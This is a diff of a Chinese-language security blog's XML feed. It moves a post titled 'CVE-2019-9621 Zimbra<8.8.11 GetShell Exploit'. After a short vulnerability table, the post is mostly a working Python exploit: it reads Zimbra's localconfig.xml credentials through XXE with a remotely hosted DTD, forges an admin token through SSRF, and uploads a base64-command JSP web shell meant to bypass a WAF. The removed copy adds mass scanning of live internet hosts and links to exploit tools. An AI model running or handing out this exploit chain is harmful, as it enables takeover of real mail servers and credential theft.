font-stretch: normal; line-height: 1.5; font-family: 宋体;">在单服务器安装中尽管Memcached<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">虽然启动但是并没有进行使用，所以其攻击场景受到限制。</span></span></span></span></span></span></span></span></span></span></p>
-<p><strong>影响版本：</strong></p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:bash;gutter:true;"><span style="font-size: 15px;">ZimbraCollaboration Server 8.8.11 之前的版本都受到影响。具体来说：
-
-<ol>
-<li><p>Zimbra &lt; 8.7.11 版本中，攻击者可以在无需登录的情况下，实现远程代码执行。</p>
-</li>
-<li><p>Zimbra &lt; 8.8.11 版本中，在服务端使用 Memcached 做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行。<br></p></li></ol></span></pre><p></p>
-</div>
-<p><strong>&nbsp;GetShell代码</strong></p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">#coding=utf8
-import requests
-import sys
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-base_url=sys.argv[1]
-base_url=base_url.rstrip("/")
-#upload file name and content
-#modify by k8gege
-#Connect "shell.jsp" using K8fly CmdShell
-#Because the CMD parameter is encrypted using Base64(bypass WAF)
-filename = "shell.jsp"
-fileContent = r'&lt;%@page import="java.io.*"%&gt;&lt;%@page import="sun.misc.BASE64Decoder"%&gt;&lt;%try {String cmd = request.getParameter("tom");String path=application.getRealPath(request.getRequestURI());String dir="weblogic";if(cmd.equals("NzU1Ng")){out.print("[S]"+dir+"[E]");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print("-&gt;|");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print("|&lt;-");try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%&gt;'
-print(base_url)
-#dtd file url
-dtd_url="https://k8gege.github.io/zimbra.dtd"
-"""
-&lt;!ENTITY % file SYSTEM "file:../conf/localconfig.xml"&gt;
-&lt;!ENTITY % start "&lt;![CDATA["&gt;
-&lt;!ENTITY % end "]]&gt;"&gt;
-&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"&gt;
-"""
-xxe_data = r"""&lt;!DOCTYPE Autodiscover [
-     &lt;!ENTITY % dtd SYSTEM "{dtd}"&gt;
-     %dtd;
-     %all;
-     ]&gt;
-&lt;Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"&gt;
- &lt;Request&gt;
-     &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;
-     &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;
- &lt;/Request&gt;
-&lt;/Autodiscover&gt;""".format(dtd=dtd_url)
-
-
-
-<p>#XXE stage<br>headers = {<br>    “Content-Type”:”application/xml”<br>}<br>print(“[*] Get User Name/Password By XXE “)<br>r = requests.post(base_url+”/Autodiscover/Autodiscover.xml”,data=xxe_data,headers=headers,verify=False,timeout=15)<br>#print r.text<br>if ‘response schema not available’ not in r.text:<br>    print(“have no xxe”)<br>    exit()</p>
-<p>#low_token Stage<br>import re<br>pattern_name = re.compile(r”&lt;key name=(&quot;|”)zimbra_user(&quot;|”)&gt;\n.<em>?&lt;value&gt;(.</em>?)&lt;/value&gt;”)<br>pattern_password = re.compile(r”&lt;key name=(&quot;|”)zimbra_ldap_password(&quot;|”)&gt;\n.<em>?&lt;value&gt;(.</em>?)&lt;/value&gt;”)<br>username = pattern_name.findall(r.text)[0][2]<br>password = pattern_password.findall(r.text)[0][2]<br>print(username)<br>print(password)</p>
-<p>auth_body=”””&lt;soap:Envelope xmlns:soap=”<a href="http://www.w3.org/2003/05/soap-envelope&quot;" target="_blank" rel="noopener">http://www.w3.org/2003/05/soap-envelope&quot;</a>&gt;<br>   &lt;soap:Header&gt;<br>       &lt;context xmlns=”urn:zimbra”&gt;<br>           &lt;userAgent name=”ZimbraWebClient - SAF3 (Win)” version=”5.0.15_GA_2851.RHEL5_64”/&gt;<br>       &lt;/context&gt;<br>   &lt;/soap:Header&gt;<br>   &lt;soap:Body&gt;<br>     &lt;AuthRequest xmlns=”{xmlns}”&gt;<br>        &lt;account by=”adminName”&gt;{username}&lt;/account&gt;<br>        &lt;password&gt;{password}&lt;/password&gt;<br>     &lt;/AuthRequest&gt;<br>   &lt;/soap:Body&gt;<br>&lt;/soap:Envelope&gt;<br>“””<br>print(“[*] Get Low Privilege Auth Token”)<br>r=requests.post(base_url+”/service/soap”,data=auth_body.format(xmlns=”urn:zimbraAccount”,username=username,password=password),verify=False)</p>
-<p>pattern_auth_token=re.compile(r”&lt;authToken&gt;(.*?)&lt;/authToken&gt;”)</p>
-<p>low_priv_token = pattern_auth_token.findall(r.text)[0]</p>
-<p>#print(low_priv_token)</p>
-<h1 id="SSRF-Get-Admin-Token-Stage"><a href="#SSRF-Get-Admin-Token-Stage" class="headerlink" title="SSRF+Get Admin_Token Stage"></a>SSRF+Get Admin_Token Stage</h1><p>headers[“Cookie”]=”ZM_ADMIN_AUTH_TOKEN=”+low_priv_token+”;”<br>headers[“Host”]=”foo:7071”<br>print(“[*] Get Admin  Auth Token By SSRF”)<br>r = requests.post(base_url+”/service/proxy?target=<a href="https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False" target="_blank" rel="noopener">https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False</a>)</p>
-<p>admin_token =pattern_auth_token.findall(r.text)[0]<br>#print(“ADMIN_TOKEN:”+admin_token)</p>
-<p>f = {<br>    ‘filename1’:(None,”whocare”,None),<br>    ‘clientFile’:(filename,fileContent,”text/plain”),<br>    ‘requestId’:(None,”12”,None),<br>}</p>
-<p>headers ={<br>    “Cookie”:”ZM_ADMIN_AUTH_TOKEN=”+admin_token+”;”<br>}<br>print(“[<em>] Uploading file”)<br>r = requests.post(base_url+”/service/extension/clientUploader/upload”,files=f,headers=headers,verify=False)<br>#print(r.text)<br>print(“Shell: “+base_url+”/downloads/“+filename)<br>#print(“Connect &quot;shell.jsp&quot; using K8fly CmdShell\nBecause the CMD parameter is encrypted using Base64(bypass WAF)”)<br>print(“[</em>] Request Result:”)<br>s = requests.session()<br>r = s.get(base_url+”/downloads/“+filename,verify=False,headers=headers)<br>#print(r.text)<br>print(“May need cookie:”)<br>print(headers[‘Cookie’])<br></p></pre><p></p>
-</div>
-<p>&nbsp;</p>
-<p><strong><span style="font-size: 16px;">配合Cscan使用(批量使用url.txt) </span><br></strong></p>
-<p>Cscan.ini配置如下</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra1.png"></p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra2.png"></p>
-<p>Cscan扫禁ping机器需加nocheck参数</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra3.png"></p>
-<p><strong><span style="font-size: 16px;">钟馗之眼随便抓一些Zimbra来测试，发现成功率高达90%</span></strong></p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra4.png"></p>
-<p>&nbsp;</p>
-<p><strong>下载</strong></p>
-<p>EXP: <a href="https://github.com/k8gege/K8tools/blob/master/Zimbra_Rce.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/Zimbra_Rce.py</a></p>
-<p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
-<p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>Ladon</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>GetShell</tag>
-        <tag>Zimbra</tag>
       </tags>
   </entry>
   <entry>
@@ -6625,18 +6467,176 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>主机发现</category>
         <category>源码</category>
+        <category>主机发现</category>
         <category>内网渗透</category>
         <category>嗅探</category>
-        <category>信息收集</category>
         <category>编程</category>
+        <category>信息收集</category>
         <category>Python</category>
       </categories>
       <tags>
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2019-9621 Zimbra&lt;8.8.11 GetShell Exploit</title>
+    <url>/p/19452dd9.html</url>
+    <content><![CDATA[<table style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial; width: 567px;">
+<tbody style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<tr class="firstRow" style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border: 1px solid #000;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">发现时间</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: #000 #000 #000 currentcolor; border-style: solid solid solid none; border-width: 1px 1px 1px medium; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">2019<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">年<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">03<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">月<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">18<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">日</span></span></span></span></span></span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">威胁目标</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">采用<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">邮件系统的企业</span></span></span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">主要风险</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">远程代码执行</span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">攻击入口</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">localconfig.xml &nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">配置文件</span></span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">使用漏洞</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">CVE-2019-9621</span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; height: 25px;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">受影响应用</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px 0px 5px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; border: none; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">ZimbraCollaboration Server 8.8.11&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">之前的版本都受到影响。</span></span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">已知影响</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">导致服务器信息泄露</span></p>
+</td>
+</tr>
+<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">威胁程度</span></p>
+</td>
+<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
+<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">高</span></p>
+</td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+<h3 style="margin: 0px; padding: 0px; font-weight: normal; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 19px; line-height: 21.85px; font-family: arial, sans-serif; color: black;"><span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; font-size: 19px; line-height: 21.85px; font-family: 宋体; color: black; letter-spacing: 0px;">漏洞描述：</span></span></h3>
+<p><span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体; font-size: 15px;"><span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">当<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;Zimbra&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">存在像任意文件读取、<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">XXE<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">（<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">xml<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">外部实体注入）<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">这种漏洞时，攻击者可以利用此漏洞读取<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;localconfig.xml<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">配置文件，获取到<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;zimbra admin ldap password<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">，并通过<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;7071 admin&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">端口进行<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;SOAP AuthRequest&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">认证，得到<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;admin authtoken</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>漏洞是利用XXE<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">和ProxyServlet SSRF&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">漏洞拿到&nbsp;admin authtoken&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">服务端打来Memcached<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">缓存服务是，<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">可以利用SSRF<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">攻击进行反序列化执行远程代码。不过由于Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">在单服务器安装中尽管Memcached<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">虽然启动但是并没有进行使用，所以其攻击场景受到限制。</span></span></span></span></span></span></span></span></span></span></p>
+<p><strong>影响版本：</strong></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:bash;gutter:true;"><span style="font-size: 15px;">ZimbraCollaboration Server 8.8.11 之前的版本都受到影响。具体来说：
+
+<ol>
+<li><p>Zimbra &lt; 8.7.11 版本中，攻击者可以在无需登录的情况下，实现远程代码执行。</p>
+</li>
+<li><p>Zimbra &lt; 8.8.11 版本中，在服务端使用 Memcached 做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行。<br></p></li></ol></span></pre><p></p>
+</div>
+<p><strong>&nbsp;GetShell代码</strong></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#coding=utf8
+import requests
+import sys
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+base_url=sys.argv[1]
+base_url=base_url.rstrip("/")
+#upload file name and content
+#modify by k8gege
+#Connect "shell.jsp" using K8fly CmdShell
+#Because the CMD parameter is encrypted using Base64(bypass WAF)
+filename = "shell.jsp"
+fileContent = r'&lt;%@page import="java.io.*"%&gt;&lt;%@page import="sun.misc.BASE64Decoder"%&gt;&lt;%try {String cmd = request.getParameter("tom");String path=application.getRealPath(request.getRequestURI());String dir="weblogic";if(cmd.equals("NzU1Ng")){out.print("[S]"+dir+"[E]");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print("-&gt;|");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print("|&lt;-");try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%&gt;'
+print(base_url)
+#dtd file url
+dtd_url="https://k8gege.github.io/zimbra.dtd"
+"""
+&lt;!ENTITY % file SYSTEM "file:../conf/localconfig.xml"&gt;
+&lt;!ENTITY % start "&lt;![CDATA["&gt;
+&lt;!ENTITY % end "]]&gt;"&gt;
+&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"&gt;
+"""
+xxe_data = r"""&lt;!DOCTYPE Autodiscover [
+     &lt;!ENTITY % dtd SYSTEM "{dtd}"&gt;
+     %dtd;
+     %all;
+     ]&gt;
+&lt;Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"&gt;
+ &lt;Request&gt;
+     &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;
+     &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;
+ &lt;/Request&gt;
+&lt;/Autodiscover&gt;""".format(dtd=dtd_url)
+
+
+
+<p>#XXE stage<br>headers = {<br>    “Content-Type”:”application/xml”<br>}<br>print(“[*] Get User Name/Password By XXE “)<br>r = requests.post(base_url+”/Autodiscover/Autodiscover.xml”,data=xxe_data,headers=headers,verify=False,timeout=15)<br>#print r.text<br>if ‘response schema not available’ not in r.text:<br>    print(“have no xxe”)<br>    exit()</p>
